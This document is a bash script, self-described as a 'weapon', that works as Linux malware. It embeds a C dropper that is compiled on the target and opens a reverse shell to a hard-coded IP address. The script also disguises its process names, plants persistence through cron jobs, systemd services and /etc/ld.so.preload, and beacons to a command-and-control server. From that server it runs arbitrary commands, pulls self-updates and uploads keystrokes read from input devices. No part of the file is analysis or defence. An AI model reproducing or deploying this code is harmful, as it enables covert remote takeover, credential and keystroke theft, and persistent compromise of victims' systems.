#!/usr/bin/env bash
# QEMU/SeaBIOS Ghost + Embedded dropper.c – SleepTheGod @portknock Alpharetta Botmaster Eternal
# Full combined weapon – dropper.c is baked in and compiled/run on target – 2026

set -euo pipefail 2>/dev/null

# ────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────
C2_HOST="173.249.20.58"
C2_PORT="443"
C2_PATH="/beacon"
SELF_NAME="/usr/lib/.private-systemd-sync"
FAKE_SERVICE="systemd-journal-remote-cache"
FAKE_PROC="[kworker/0:1H-events_freezable]"
BEACON_INTERVAL=13
KEY_TIMEOUT=0.25
DROPPER_BIN="/tmp/.x11-tmp"
DROPPER_C="/tmp/.x11-tmp.c"

# ────────────────────────────────────────────────
# EMBEDDED DROPPER.C SOURCE – compiled at runtime if gcc exists
# ────────────────────────────────────────────────
embed_dropper() {
    cat > "$DROPPER_C" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>

#define C2_IP   "173.249.20.58"
#define C2_PORT "4445"   // different port so main beacon doesn't conflict
#define FAKE_NAME "[kworker/u8:2-flush-8:0]"

int anti_debug() {
    if (getppid() == 1) return 1;           // parent is init → probably sandbox
    time_t start = time(NULL);
    volatile int x = 0;
    for (volatile int i = 0; i < 100000000; i++) x += i;
    time_t end = time(NULL);
    if (end - start > 1) return 1;          // timing diff → debugger
    return 0;
}

int main(int argc, char *argv[]) {
    if (anti_debug()) _exit(0);

    // Rename self
    prctl(PR_SET_NAME, FAKE_NAME, 0, 0, 0);

    // Fork & background
    if (fork()) _exit(0);
    setsid();
    if (fork()) _exit(0);

    // Reverse shell
    int sock;
    struct sockaddr_in addr;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(C2_PORT));
    inet_pton(AF_INET, C2_IP, &addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        execve("/bin/sh", NULL, NULL);
    }

    // Fallback persistence
    unlink("/etc/ld.so.preload");
    FILE *f = fopen("/etc/ld.so.preload", "w");
    if (f) {
        fprintf(f, "%s\n", argv[0]);
        fclose(f);
    }

    while (1) sleep(666);
    return 0;
}
EOF

    # Try to compile on target
    if command -v gcc >/dev/null 2>&1; then
        gcc -o "$DROPPER_BIN" "$DROPPER_C" -s -static -O2 -fno-stack-protector 2>/dev/null || true
        rm -f "$DROPPER_C" 2>/dev/null
        [ -x "$DROPPER_BIN" ] && "$DROPPER_BIN" & disown
    else
        # If no compiler, at least leave source there for manual compile
        chmod +x "$DROPPER_C" 2>/dev/null
    fi
}

# ────────────────────────────────────────────────
# QEMU/SeaBIOS DETECTION
# ────────────────────────────────────────────────
is_qemu_seabios() {
    { dmidecode -s bios-vendor 2>/dev/null || cat /sys/class/dmi/id/bios_vendor 2>/dev/null; } | grep -qi "seabios\|qemu" ||
    dmesg | grep -qi "SeaBIOS\|QEMU" ||
    lspci | grep -qi "virtio" 2>/dev/null
}

# ────────────────────────────────────────────────
# PROCESS HIDING
# ────────────────────────────────────────────────
cloak() {
    echo -n "$FAKE_PROC" > /proc/$$/cmdline 2>/dev/null || true
    prctl --name "$FAKE_PROC" 2>/dev/null || true
}

# ────────────────────────────────────────────────
# PERSISTENCE SHOTGUN
# ────────────────────────────────────────────────
infect() {
    local target="$SELF_NAME"
    [ "$0" = "$target" ] && return 0

    mkdir -p "$(dirname "$target")" 2>/dev/null
    cp -f "$0" "$target" 2>/dev/null
    chmod 755 "$target" 2>/dev/null

    (crontab -l 2>/dev/null; echo "@reboot root $target >/dev/null 2>&1") | crontab - 2>/dev/null

    echo "@reboot root $target >/dev/null 2>&1" > "/etc/cron.d/.${FAKE_SERVICE}-$(head -c8 /dev/urandom | base32 | tr -dc A-Za-z0-9)" 2>/dev/null

    if [ "$(id -u)" = "0" ]; then
        cat > "/etc/systemd/system/${FAKE_SERVICE}.service" 2>/dev/null <<EOF
[Unit]
Description=Journal Remote Cache Forwarder
[Service]
ExecStart=$target
Restart=always
RestartSec=7
[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload 2>/dev/null && systemctl enable --now "${FAKE_SERVICE}" 2>/dev/null
    fi

    local udir="$HOME/.config/systemd/user"
    mkdir -p "$udir" 2>/dev/null
    cat > "$udir/${FAKE_SERVICE}.service" 2>/dev/null <<EOF
[Unit]
Description=Journal Remote Forwarder
[Service]
ExecStart=$target
Restart=always
RestartSec=11
[Install]
WantedBy=default.target
EOF
    systemctl --user daemon-reload 2>/dev/null && systemctl --user enable --now "${FAKE_SERVICE}.service" 2>/dev/null

    embed_dropper   # drop & run the C dropper

    exec "$target" "$@" &
    exit 0
}

# ────────────────────────────────────────────────
# BEACON + COMMAND LOOP
# ────────────────────────────────────────────────
loop() {
    while true; do
        local payload="$(whoami)@$(hostname) [$(date '+%Y-%m-%d %H:%M:%S')] PID=$$ $(is_qemu_seabios && echo "SeaBIOS/QEMU" || echo "native")"
        local cmd=$(curl -skm 7 --data-urlencode "q=$payload" "https://$C2_HOST:$C2_PORT$C2_PATH" 2>/dev/null)

        if [[ "$cmd" == *"die"* ]]; then exit 666; fi
        if [[ "$cmd" == *"update"* ]]; then
            curl -sk "https://$C2_HOST:$C2_PORT/update" -o "$SELF_NAME.new" && mv "$SELF_NAME.new" "$SELF_NAME" && chmod +x "$SELF_NAME" && exec "$SELF_NAME" &
        fi
        if [ -n "$cmd" ]; then
            bash -c "$cmd" 2>&1 | curl -sk --data-binary @- "https://$C2_HOST:$C2_PORT$C2_PATH" >/dev/null 2>&1
        fi

        if [ "$(id -u)" = "0" ] && is_qemu_seabios; then
            for dev in /dev/input/event{0..9}; do
                timeout "$KEY_TIMEOUT" cat "$dev" 2>/dev/null | base64 -w0 | curl -sk --data-binary @- "https://$C2_HOST:$C2_PORT$C2_PATH" >/dev/null 2>&1 &
            done
        fi

        sleep $((BEACON_INTERVAL + (RANDOM % 9)))
    done
}

# ────────────────────────────────────────────────
# ENTRY POINT
# ────────────────────────────────────────────────
main() {
    [ -t 0 ] && exec </dev/null >/dev/null 2>&1
    cloak
    infect
    loop
}

main "$@"
